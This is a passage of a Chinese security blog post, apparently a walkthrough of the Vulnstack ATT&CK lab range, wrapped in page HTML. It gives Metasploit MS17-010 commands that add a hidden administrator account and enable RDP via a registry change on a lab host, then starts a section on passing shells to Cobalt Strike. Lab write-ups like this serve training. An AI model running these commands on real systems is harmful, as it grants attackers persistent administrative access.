+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png" title="image-20230516221804853" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png 2x"
+            sizes="auto"
+            alt="image-20230516221804853">
+    </a></figure></p>
+<p>经过了几次尝试，没有打下来</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png" title="image-20230516222729801" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png 2x"
+            sizes="auto"
+            alt="image-20230516222729801">
+    </a></figure></p>
+<p>可以尝试执行一些系统权限命令，比如添加管理员账户尝试3389登录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/admin/smb/ms17_010_command
+</span></span><span class="line"><span class="cl">show options
+</span></span><span class="line"><span class="cl">set rhosts 192.168.52.141
+</span></span><span class="line"><span class="cl">//添加用户
+</span></span><span class="line"><span class="cl">set command net user kun hongrisec@2019 /add
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png" title="image-20230516223044761" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png 2x"
+            sizes="auto"
+            alt="image-20230516223044761">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//提升管理员权限
+</span></span><span class="line"><span class="cl">set command net localgroup administrators kun /add
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">//开启3389端口
+</span></span><span class="line"><span class="cl">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后使用proxychains4连接win2003的3389(kun用户登录)</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png" title="image-20230516232345980" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png 2x"
+            sizes="auto"
+            alt="image-20230516232345980">
+    </a></figure></p>
+<p>。。。。。。。。。。</p>
+<p>没搞完，先搁着吧</p>
+<p>​</p>
+<h1 id="msf联动cobaltstrike" class="headerLink">
+    <a href="#msf%e8%81%94%e5%8a%a8cobaltstrike" class="header-mark"></a>msf联动cobaltstrike</h1><p>msf获取到shell后，可以派发给cobaltstrike</p>
+<p>首先cobaltstrike创建监听器：</p>
+</div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/vulnstack-attck_1/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\Vulnstack-ATT&CK_1.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\Vulnstack-ATT&CK_1.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20Vulnstack-ATT%26CK%28%E4%B8%80%29&body=|Field|Value|%0A|-|-|%0A|Title|Vulnstack-ATT%26CK%28%E4%B8%80%29|%0A|Url|http://scofield1920.github.io/vulnstack-attck_1/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\Vulnstack-ATT&CK_1.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/vulnstack-attck_1/" data-title="Vulnstack-ATT&amp;CK(一)" data-hashtags="permeation"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/vulnstack-attck_1/" data-hashtag="permeation"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/vulnstack-attck_1/" data-title="Vulnstack-ATT&amp;CK(一)"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/vulnstack-attck_1/" data-title="Vulnstack-ATT&amp;CK(一)"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/vulnstack-attck_1/" data-title="Vulnstack-ATT&amp;CK(一)"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/vulnstack-attck_1/" data-title="Vulnstack-ATT&amp;CK(一)" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;Vulnstack-ATT\u0026CK(一)&#34;, &#34;http://scofield1920.github.io/vulnstack-attck_1/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/permeation/">permeation</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/log_analysis/" class="prev" rel="prev" title="web流量审计与日志分析"><i class="fas fa-angle-left fa-fw"></i>web流量审计与日志分析</a>
+            <a href="/vmware_vpn2/" class="next" rel="next" title="VMware虚拟机通过物理机的vpn代理实现科学上网">VMware虚拟机通过物理机的vpn代理实现科学上网<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
